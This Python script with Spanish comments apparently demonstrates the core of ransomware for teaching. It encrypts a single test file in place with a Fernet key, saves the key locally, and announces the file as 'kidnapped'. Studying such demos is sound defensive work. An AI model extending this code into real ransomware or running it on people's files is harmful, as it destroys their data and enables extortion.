import os
from cryptography.fernet import Fernet

# 1. Generamos la llave maestra (La que el atacante se queda)
key = Fernet.generate_key()
with open("clave.key", "wb") as key_file:
    key_file.write(key)

# 2. Cargamos la función de cifrado
fernet = Fernet(key)

# 3. El archivo objetivo (el que creamos antes)
archivo_objetivo = "notas_secretas.txt"

if os.path.exists(archivo_objetivo):
    # Leer el contenido original
    with open(archivo_objetivo, "rb") as f:
        datos = f.read()
    
    # Cifrar los datos
    datos_cifrados = fernet.encrypt(datos)
    
    # Sobrescribir el archivo con basura ilegible
    with open(archivo_objetivo, "wb") as f:
        f.write(datos_cifrados)
        
    print(f"¡ÉXITO! El archivo '{archivo_objetivo}' ha sido secuestrado.")
    print("Nota: Se ha generado 'clave.key'. Sin ella, los datos se pierden para siempre.")
else:
    print("Error: No se encuentra el archivo notas_secretas.txt")
